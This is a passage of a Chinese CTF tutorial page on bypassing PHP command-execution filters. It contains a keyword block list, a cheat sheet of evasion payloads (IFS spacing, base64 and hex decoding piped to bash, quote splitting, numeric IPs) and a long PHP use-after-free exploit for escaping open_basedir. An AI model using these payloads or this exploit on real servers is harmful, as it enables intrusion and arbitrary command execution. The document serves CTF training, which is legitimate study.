/var/www/html/2.php</span></span><br></pre></td></tr></table></figure><h4 id="2-1-2-长度限制绕过">2.1.2 长度限制绕过</h4><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>此题利用substr函数对eval的代码进行了限制</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=<span class="string">`$F `</span>; <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">经过<span class="keyword">substr</span>($F,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  <span class="string">`$F `</span>;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`$F `;&quot;</span>);</span><br><span class="line">我们把原来的$F带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``$F `;sleep 3`&quot;</span>);</span><br><span class="line">也就是说最终会执行  <span class="string">` `</span>$F <span class="string">`;sleep 3 `</span> == shell_exec(<span class="string">&quot;`$F `; sleep 3&quot;</span>);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">所以 最后就是一道无回显的RCE题目了，将<span class="keyword">sleep</span> <span class="number">3</span>换成我们<span class="number">2.1</span>.<span class="number">1</span>节中所讲的操作即可得到答案</span><br></pre></td></tr></table></figure><h4 id="2-1-3-命令绕过">2.1.3 命令绕过</h4><h5 id="2-1-3-1-空格">2.1.3.1 空格</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span>              </span><br><span class="line"></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;                        <span class="literal">--</span>这里把，替换成了空格键</span><br><span class="line"></span><br><span class="line">%<span class="number">20</span>                                   <span class="literal">--</span>代表space键</span><br><span class="line"></span><br><span class="line">\x20  <span class="literal">--</span>代表space键，eval类中可用</span><br><span class="line"></span><br><span class="line">%<span class="number">09</span>           <span class="literal">--</span>需要php环境，如<span class="built_in">cat</span>%<span class="number">09</span>flag.php</span><br><span class="line"></span><br><span class="line">\x09  <span class="literal">--</span>代表space键，eval类中可用</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;  <span class="literal">--</span>单纯<span class="built_in">cat</span><span class="variable">$IFS2</span>,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如<span class="built_in">cat</span><span class="variable">$</span>&#123;IFS2&#125;flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span>  <span class="literal">--</span>后面加个<span class="variable">$</span>与&#123;&#125;类似，起截断作用，<span class="variable">$9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，如<span class="built_in">cat</span><span class="variable">$IFS2</span><span class="variable">$9flag</span>.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;    <span class="literal">--</span>重定向，如<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"></span><br><span class="line">&lt;&gt;       <span class="literal">--</span>重定向，如<span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure><h5 id="2-1-4-2-字符串拼接绕过">2.1.4.2 字符串拼接绕过</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span><span class="operator">=</span>l<span class="comment">;b=s;c=/;$a$b $c</span></span><br></pre></td></tr></table></figure><p>定义变量a为l，b为s，c为/，执行命令$a$b $c即ls /</p><h5 id="2-1-4-3-base64编码绕过">2.1.4.3 base64编码绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|<span class="built_in">base64</span> -d 其将会打印123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | bash </span><br><span class="line">`<span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d`                   ==&gt;三种结果皆为<span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure><h5 id="2-1-4-4-16进制编码绕过">2.1.4.4 16进制编码绕过</h5><p>生成脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//6c73202f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">6</span>c73202f | <span class="type">xxd</span> -r -p | <span class="type">bash</span></span><br><span class="line">`echo <span class="number">6</span>c73 | <span class="type">xxd</span> -r -p`</span><br><span class="line">echo `<span class="number">6</span>c73202f` | <span class="type">xxd</span> -r -p | <span class="type">sh</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h5 id="2-1-4-5-单双引号绕过">2.1.4.5 单双引号绕过</h5><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t <span class="built_in">flag</span> </span><br><span class="line">ca<span class="string">&quot;&quot;</span>t <span class="built_in">flag</span></span><br><span class="line">l<span class="string">&#x27;&#x27;</span>s /</span><br><span class="line">l<span class="string">&quot;&quot;</span>s /</span><br></pre></td></tr></table></figure><h5 id="2-1-4-6-反斜杠绕过">2.1.4.6 反斜杠绕过</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l<span class="string">\s</span> /</span><br><span class="line">l<span class="string">\s</span> /<span class="keyword">var</span>/www/ht<span class="string">\ml</span></span><br><span class="line">ca<span class="string">\t</span> f<span class="string">\ag</span></span><br></pre></td></tr></table></figure><h5 id="2-1-4-7-绕过ip中的句点">2.1.4.7 绕过ip中的句点</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网络地址可以转换成数字地址，比如<span class="number">127.0</span>.<span class="number">0.1</span>可以转化为<span class="number">2130706433</span>。</span><br><span class="line">可以直接访问http:<span class="regexp">//</span><span class="number">2130706433</span>或者http:<span class="regexp">//</span><span class="number">0</span>x7F000001，这样就可以绕过.的ip过滤。</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">数字转ip地址</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">ip地址转数字</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">域名转数字ip</a></p><h5 id="2-1-4-8-正则匹配绕过">2.1.4.8 正则匹配绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag  =&gt;   <span class="built_in">cat</span> [e-g]lag</span><br><span class="line">   <span class="built_in">cat</span> f&#123;k..m&#125;ag</span><br></pre></td></tr></table></figure><p>两种正则匹配稍有不同：</p><p>1.[]为开区间，并<strong>不包含</strong>左右边界</p><p>2.{}为闭区间，<strong>包含</strong>左右边界</p><p>所以可得，前者只会匹配f，而后者会匹配k,l,m</p><h5 id="2-1-4-9-内敛执行法绕过">2.1.4.9 内敛执行法绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `<span class="built_in">ls</span>`</span><br><span class="line">//获取<span class="built_in">ls</span>下的所有的文件内容</span><br></pre></td></tr></table></figure><h5 id="2-1-4-10-黑洞绕过">2.1.4.10 黑洞绕过</h5><p><strong>黑洞：</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="regexp">/dev/</span><span class="keyword">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">&gt;代表重定向，会将我们命令执行的所有结果全部丢进预定义的<span class="regexp">/dev/</span><span class="keyword">null</span>这一垃圾桶中，导致我们收不到回显</span><br></pre></td></tr></table></figure><p>利用管道符绕过,效果详见1.1节</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls || &gt;<span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="2-1-4-11-绕过open-basedir">2.1.4.11 绕过open_basedir()</h5><p><strong>1.ini_set重设置绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置 open_basedir</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/path/to/allowed/directory:/another/allowed/directory&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以设置多个安全目录，目录和目录之间可以使用:进行分隔</p><p><strong>2.UAF脚本绕过安全目录</strong></p><p>使用时需要进行url编码再传入（bp编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span 